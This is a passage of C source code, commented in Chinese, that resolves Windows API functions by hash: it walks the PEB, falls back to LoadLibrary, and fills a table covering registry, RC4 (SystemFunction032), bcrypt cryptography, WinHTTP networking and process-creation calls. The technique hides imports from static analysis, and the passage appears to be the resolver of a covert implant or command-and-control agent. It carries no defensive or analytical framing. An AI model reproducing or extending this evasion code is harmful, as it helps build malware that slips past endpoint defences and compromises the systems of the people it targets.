        pApi->pfnRegQueryValueExW = (fnRegQueryValueExW)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_REGQUERYVALUEEXW_HASH);
        pApi->pfnRegCloseKey = (fnRegCloseKey)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_REGCLOSEKEY_HASH);
        pApi->pfnCryptAcquireContextW = (fnCryptAcquireContextW)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_CRYPTACQUIRECONTEXTW_HASH);
        pApi->pfnCryptReleaseContext = (fnCryptReleaseContext)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_CRYPTRELEASECONTEXT_HASH);
        pApi->pfnCryptGenRandom = (fnCryptGenRandom)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_CRYPTGENRANDOM_HASH);
        pApi->pfnSystemFunction032 = (fnSystemFunction032)GetApiAddressByHash(hAdvapi32, H_MOD_ADVAPI32_DLL_HASH, H_FUNC_SYSTEMFUNCTION032_HASH);
    }

    /* --- bcrypt.dll（通过 LoadLibrary 回退加载） --- */
    hBcrypt = GetModuleByPeb(H_MOD_BCRYPT_DLL_HASH);
    if (!hBcrypt && pApi->pfnLoadLibraryW) {
        hBcrypt = pApi->pfnLoadLibraryW(L"bcrypt.dll");
    }
    if (hBcrypt) {
        pApi->pfnBCryptOpenAlgorithmProvider = (fnBCryptOpenAlgorithmProvider)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTOPENALGORITHMPROVIDER_HASH);
        pApi->pfnBCryptCloseAlgorithmProvider = (fnBCryptCloseAlgorithmProvider)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTCLOSEALGORITHMPROVIDER_HASH);
        pApi->pfnBCryptGetProperty = (fnBCryptGetProperty)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTGETPROPERTY_HASH);
        pApi->pfnBCryptSetProperty = (fnBCryptSetProperty)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTSETPROPERTY_HASH);
        pApi->pfnBCryptGenerateSymmetricKey = (fnBCryptGenerateSymmetricKey)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTGENERATESYMMETRICKEY_HASH);
        pApi->pfnBCryptDestroyKey = (fnBCryptDestroyKey)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTDESTROYKEY_HASH);
        pApi->pfnBCryptEncrypt = (fnBCryptEncrypt)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTENCRYPT_HASH);
        pApi->pfnBCryptDecrypt = (fnBCryptDecrypt)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTDECRYPT_HASH);
        pApi->pfnBCryptImportKey = (fnBCryptImportKey)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTIMPORTKEY_HASH);
        pApi->pfnBCryptCreateHash = (fnBCryptCreateHash)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTCREATEHASH_HASH);
        pApi->pfnBCryptHashData = (fnBCryptHashData)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTHASHDATA_HASH);
        pApi->pfnBCryptFinishHash = (fnBCryptFinishHash)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTFINISHHASH_HASH);
        pApi->pfnBCryptDestroyHash = (fnBCryptDestroyHash)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTDESTROYHASH_HASH);
        pApi->pfnBCryptGenRandom = (fnBCryptGenRandom)GetApiAddressByHash(hBcrypt, H_MOD_BCRYPT_DLL_HASH, H_FUNC_BCRYPTGENRANDOM_HASH);
    }

    /* --- winhttp.dll（通过 LoadLibrary 回退加载） --- */
    hWinhttp = GetModuleByPeb(H_MOD_WINHTTP_DLL_HASH);
    if (!hWinhttp && pApi->pfnLoadLibraryW) {
        hWinhttp = pApi->pfnLoadLibraryW(L"winhttp.dll");
    }
    if (hWinhttp) {
        pApi->pfnWinHttpOpen = (fnWinHttpOpen)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPOPEN_HASH);
        pApi->pfnWinHttpConnect = (fnWinHttpConnect)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPCONNECT_HASH);
        pApi->pfnWinHttpOpenRequest = (fnWinHttpOpenRequest)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPOPENREQUEST_HASH);
        pApi->pfnWinHttpSendRequest = (fnWinHttpSendRequest)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPSENDREQUEST_HASH);
        pApi->pfnWinHttpReceiveResponse = (fnWinHttpReceiveResponse)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPRECEIVERESPONSE_HASH);
        pApi->pfnWinHttpQueryDataAvailable = (fnWinHttpQueryDataAvailable)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPQUERYDATAAVAILABLE_HASH);
        pApi->pfnWinHttpReadData = (fnWinHttpReadData)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPREADDATA_HASH);
        pApi->pfnWinHttpCloseHandle = (fnWinHttpCloseHandle)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPCLOSEHANDLE_HASH);
        pApi->pfnWinHttpSetOption = (fnWinHttpSetOption)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPSETOPTION_HASH);
        pApi->pfnWinHttpCrackUrl = (fnWinHttpCrackUrl)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPCRACKURL_HASH);
        pApi->pfnWinHttpQueryHeaders = (fnWinHttpQueryHeaders)GetApiAddressByHash(hWinhttp, H_MOD_WINHTTP_DLL_HASH, H_FUNC_WINHTTPQUERYHEADERS_HASH);
    }

    /* 验证必需的 API（kernel32 + ntdll 必须全部解析成功） */
    return pApi->pfnCreateFileW != NULL &&
           pApi->pfnReadFile != NULL &&
           pApi->pfnWriteFile != NULL &&
           pApi->pfnCloseHandle != NULL &&
           pApi->pfnDuplicateHandle != NULL &&
           pApi->pfnCreateProcessW != NULL &&
           pApi->pfnOpenProcess != NULL &&
           pApi->pfnVirtualAlloc != NULL &&
           pApi->pfnHeapAlloc != NULL &&
           pApi->pfnHeapFree != NULL &&
           pApi->pfnGetProcessHeap != NULL &&
           pApi->pfnSleep != NULL &&
           pApi->pfnGetCurrentProcessId != NULL &&
           pApi->pfnRtlGetVersion != NULL;
}
